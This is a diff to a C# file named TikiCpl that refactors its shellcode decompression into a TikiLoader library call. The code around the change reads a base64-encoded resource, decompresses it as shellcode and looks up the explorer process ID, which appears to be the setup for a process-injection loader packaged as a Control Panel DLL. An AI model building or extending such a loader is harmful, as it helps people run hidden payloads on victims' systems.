@@ -1,10 +1,10 @@
 ﻿using System;
-using System.Diagnostics;
-using System.Runtime.InteropServices;
-using TikiLoader;
 using System.IO;
 using System.Reflection;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
 using RGiesecke.DllExport;
+using TikiLoader;
 
 public class TikiCpl
 {
@@ -22,30 +22,6 @@ public class TikiCpl
 
     }
     private delegate IntPtr GetPebDelegate();
-
-    static byte[] Decompress(byte[] gzip)
-    {
-        using (System.IO.Compression.GZipStream stream = new System.IO.Compression.GZipStream(new System.IO.MemoryStream(gzip),
-            System.IO.Compression.CompressionMode.Decompress))
-        {
-            const int size = 4096;
-            byte[] buffer = new byte[size];
-            using (System.IO.MemoryStream memory = new System.IO.MemoryStream())
-            {
-                int count = 0;
-                do
-                {
-                    count = stream.Read(buffer, 0, size);
-                    if (count > 0)
-                    {
-                        memory.Write(buffer, 0, count);
-                    }
-                }
-                while (count > 0);
-                return memory.ToArray();
-            }
-        }
-    }
 
     public static int FindProcessPid(string process)
     {
@@ -71,7 +47,7 @@ public class TikiCpl
 
         string scode = ExtractResource("TikiCpl.Resource.txt");
         byte[] blob = Convert.FromBase64String(scode);
-        byte[] shellcode = Decompress(blob);
+        byte[] shellcode = Loader.DecompressShellcode(blob);
 
         if (shellcode.Length == 0) return IntPtr.Zero;
             int ppid = FindProcessPid("explorer");
